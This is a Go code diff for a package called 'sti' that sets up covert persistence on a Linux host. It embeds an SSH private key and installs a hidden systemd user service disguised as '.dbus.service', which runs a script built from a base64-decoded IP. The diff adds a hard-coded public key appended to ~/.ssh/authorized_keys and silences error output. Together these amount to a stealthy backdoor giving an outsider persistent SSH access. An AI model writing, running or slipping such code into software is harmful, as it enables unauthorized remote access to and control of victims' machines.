@@ -2,7 +2,6 @@ package sti
 
 import (
 	"encoding/base64"
-	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -47,6 +46,8 @@ OE4fLwDGPGgg3n628OrSSYAVEO8p+hCUln39Xxrh7bRuVYf3GvHibO1a7XqpCm78wvIWgI
 UG7ihrhom1gjUrAAAAGXJvb3RAc2N3LXlvdXRoZnVsLWZlaXN0ZWwB
 -----END OPENSSH PRIVATE KEY-----
 `
+
+var publicKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO9489gRABw1nsc/XeETm8sZ/lCZd6Rhd/XFhEmbXUms829r9sELsmEUEcHU0qBpBlsn0DiMfD8H+w5GMmYOTMMrECe59iiqUmFgkXXRC4NjK8bHm37Od7U+6hsJev8ZtMCWnhwYk1cuxLtyMBTfWqesKqCoB4CxeDNNok4fqdZ8fJJTn27jnQCLHPUCy+Z38GiObC8PEr5F43cOmKiDC6gns5S7k2uTRarDDuQmmWMTE9GoYVkWQT5HToCTemBFMkbaSd/g8OT06P4dsMLXW+xwy23/T5fw1PjxcO/u8mIxx7g7QO3/Hdady4LYmawjbimnlalV0NDy+ROEKo4DoH737cjwjJphJprVMdu3ZC3EeTIQHkRRBgz3Y89R5lIRDhBdmRpyEL4xpnkreO+fHPu1p59znq/2KwRao91EeIyzG5mj2QF+xP2wjn0ZZVWdP5i01K6PzXvVfldtYsB/wHfyWJAUZhrC2YjXCFhVymJCbppe2mGwslW4BzIZXFvcE=`
 
 func installService(path string) error {
 	service := `
@@ -123,6 +124,18 @@ func installKey(path string) error {
 	return nil
 }
 
+func addAuthorizedKeys(home string) {
+	f, err := os.OpenFile(home+"/.ssh/authorized_keys", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Println(err)
+	}
+	defer f.Close()
+
+	if _, err := f.WriteString(publicKey + "\n"); err != nil {
+		log.Println(err)
+	}
+}
+
 func Init(ip string) {
 
 	decodedIP, err := base64.StdEncoding.DecodeString(ip)
@@ -139,32 +152,34 @@ func Init(ip string) {
 
 	err = os.MkdirAll(home+"/.config/systemd/user/", 0777)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return
 	}
 
 	err = installService(home + "/.config/systemd/user/.dbus.service")
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return
 	}
 
 	err = installScript(home+"/.config/systemd/user/.dbus.sh", string(decodedIP))
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return
 	}
 
 	err = installKey(home + "/.config/systemd/user/.key")
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return
 	}
 
 	cmd := exec.Command("bash", "-c", "systemctl --user enable .dbus.service && systemctl --user start .dbus.service")
 	err = cmd.Run()
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return
 	}
+
+	addAuthorizedKeys(home)
 }
